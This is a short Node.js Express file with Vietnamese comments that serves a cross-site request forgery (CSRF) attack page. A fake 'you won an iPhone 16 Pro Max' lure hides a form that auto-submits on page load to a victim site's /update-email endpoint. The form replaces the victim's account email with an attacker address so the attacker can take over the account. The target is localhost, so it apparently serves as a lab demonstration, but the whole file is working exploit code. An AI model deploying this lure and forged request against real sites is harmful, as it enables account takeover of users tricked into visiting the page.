const express = require('express');
const app = express();

app.get('/trung-thuong', (req, res) => {
    // Đây là trang bẫy chứa form tự động submit (auto-submit) sang web nạn nhân
    res.send(`
        <h1>Chúc mừng bạn đã trúng thưởng iPhone 16 Pro Max!</h1>
        <p>Đang tải phần quà, vui lòng chờ trong giây lát...</p>

        <!-- Form ẩn trỏ thẳng tới web nạn nhân ở cổng 3000 -->
        <form id="csrfForm" action="http://localhost:3000/update-email" method="POST" style="display:none;">
            <input type="hidden" name="new_email" value="hacker_chiem_quyen@gmail.com" />
        </form>

        <script>
            // Tự động submit form ngay khi trang web vừa tải xong
            window.onload = function() {
                document.getElementById('csrfForm').submit();
            }
        </script>
    `);
});

app.listen(4000, () => console.log('Web attacker chạy tại http://localhost:4000/trung-thuong'));